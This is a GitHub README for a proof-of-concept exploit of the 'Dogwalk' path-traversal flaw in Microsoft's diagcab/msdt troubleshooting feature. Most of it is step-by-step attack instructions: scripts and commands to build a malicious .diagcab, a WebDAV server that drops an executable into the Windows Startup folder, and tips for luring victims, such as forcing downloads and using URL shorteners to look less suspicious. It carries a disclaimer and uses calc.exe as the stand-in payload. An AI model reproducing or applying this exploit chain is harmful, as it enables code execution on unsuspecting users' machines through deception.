<div align=center>
<h1> Dogwalk Proof-of-Concept🐾</h1>
<pre><code>
<h><strong>🚨 Disclaimer 🚨</strong></h4>

<br><br>The PoC allows an attacker to obtain <strong>Remote Code Injection</strong> on a Windows victim device.
<br>The goal of this repo is to make a PoC even more usable than the <a href=https://github.com/irsl/microsoft-diagcab-rce-poc>initial repo</a>.
<br>DO NOT USE IT WITHOUT PRIOR AUTHORIZATION!
<br><br><i>Regarding the damage caused and the simplicity of exploitation, I hope Microsoft will fix it</i>
</code></pre>
</div>

* [🧠 Understand it](#how-it-works)
* [🐾 Run it](#lets-get-it)
* [📺 Show Me](#%EF%B8%8F-wait-and-see)

***Core concept:*** path traversal vulnerability in Microsoft's Diagcab technology (`msdt`) that could lead to remote code execution.<br>
You can find the full advisory in the [blog post](https://medium.com/@radimre83/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd)<br>
The vulnerability has been reported for **2 years** (by [@irsl](https://github.com/irsl)) and still has **no fix**!




## How it works?

The Proof-of-Concept sets up a webdav server hosting a malicious `.diagcab` file that will perform a path transversal to write a malicious executable in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`. Writing an executable in this folder will execute it each time the user starts the windows machine, this is called ***Boot Logon Autostart Execution***.

So, basically what we need is:
* webDAV server
* Malicious `.diagcab` file
* Malicious executable *(legit one or basic text file is sufficient for the PoC)*

### 🎬 Scenario

1. The victim will visit a link (phishing, social engineering, or whatever) that will download the `.diagcab` file

<sup>*(💡 use `Content-type: application/octet-stream` response header to make the Browser automaticaly downloading the file when browsing the url)*</sup>

2. The victim click on the file download (could easily/accidentaly happen by just clicking on the browser download folder)
3. The cab file loads the webdav malicious executable -> ***(path transversal)*** downloaded in Start up menu
4. The user restart his device -> ***(RCE)***

## Let's get it

If you are too lazy (or in a hurry) to proceed step-by-steps:
```shell
./hurry-dogwalk.sh [WEBDAV_URL]         # need docker
# Stop the server
./hurry-dogwalk.sh --clean
```

Otherwise ↓↓

### 🔨 Craft the  `.diagcab` file

* `.diagcfg` are simple XML files that hold reference to one or more diagnostic packages and provide meta information about them
* They are packaged into Microsoft cabinet file archives and saved with `.diagcab` extension.

Firt build `custom.diagcfg`:
```shell
./build-malicious-diagcfg.sh --url [WEBDAV_URL]
```

And build the `hotfix895214.diagcab`:
```shell
cabarc.exe n hotfix895214.diagcab custom.diagcfg
# run it on windows (or with wine). If you do not find carbarc.exe use http://jc.bellamy.free.fr/download/cabarc.exe or http://download.microsoft.com/download/platformsdk/cab/2.0/w98nt42kmexp/en-us/Cabsdk.exe
```

Finally, move it in the `./webdav/diagcab-webdav-poc/config` directory

### 🏗️ Set up the server

Put the executable you want to transfer on victim machine within `./webdav/malicious` directory... <sup>*(Here we use the classic `calc.exe`)*</sup>

...And launch the server:
```
cd ./webdav/diagcab-webdav-poc/
perl diagcab-webdav-poc.pl
```

The malicious `.diagcab` is available at `https://[WEBDAV_URL]/config/hotfix895214.diagcab`. You now have to lure a victim to click on this link.

<sup>*(💡you can use URL shortener to make it appears less suspicious)*</sup>

### 👁️ Wait and see

<details>
<summary><b>Dogwalk set up</b></summary>
<div align=center>
<img src=https://github.com/ariary/Dogwalk-rce-poc/blob/master/img/dogwalk_setup.gif>
</div>
<i>
<br> 💡 Test curl with ngrok url before: if it waits indefinitely, type the url manually instead (when copy/paste url from ngrok panel, it could add some invisible characters)</i>
<br> 💡 Sometimes <code>ngrok</code> is simply blocked ~> use <a href=https://github.com/localtunnel/localtunnel><code>localtunnel</code></a> or <code>cloudfared tunnel</code> instead. (or your own domain)</i>
</details>

🐾🐾

![demo](https://github.com/ariary/Dogwalk-rce-poc/blob/master/img/dogwalk_exploit.gif)

